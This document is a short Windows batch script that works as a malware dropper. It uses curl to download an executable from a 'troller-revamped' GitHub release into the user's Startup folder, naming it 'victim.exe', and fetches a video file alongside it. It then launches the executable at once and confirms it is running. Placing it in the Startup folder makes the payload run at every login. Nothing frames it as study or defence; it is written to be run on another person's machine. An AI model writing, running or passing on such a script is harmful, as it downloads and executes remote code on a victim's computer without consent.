@echo off
set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

:: download the executable and the video file
curl -L "https://github.com/vexnity/troller-revamped/releases/download/Release/troller.exe" -o "%STARTUP_FOLDER%\victim.exe"
curl "https://raw.githubusercontent.com/vexnity/troller-revamped/preview/test.mp4" -o "%STARTUP_FOLDER%\test.mp4"

:: check if the files are downloaded
if exist "%STARTUP_FOLDER%\victim.exe" (
    echo victim.exe downloaded successfully.
) else (
    echo Failed to download victim.exe.
    exit /b 1
)

if exist "%STARTUP_FOLDER%\test.mp4" (
    echo test.mp4 downloaded successfully.
) else (
    echo Failed to download test.mp4.
    exit /b 1
)

:: run the executable immediately
start "" "%STARTUP_FOLDER%\victim.exe"

:: check if the process started
echo Waiting for victim.exe to start...
timeout /t 5 /nobreak

tasklist /fi "imagename eq victim.exe"

echo Files have been moved to startup folder, set to run at startup, and executed.
pause
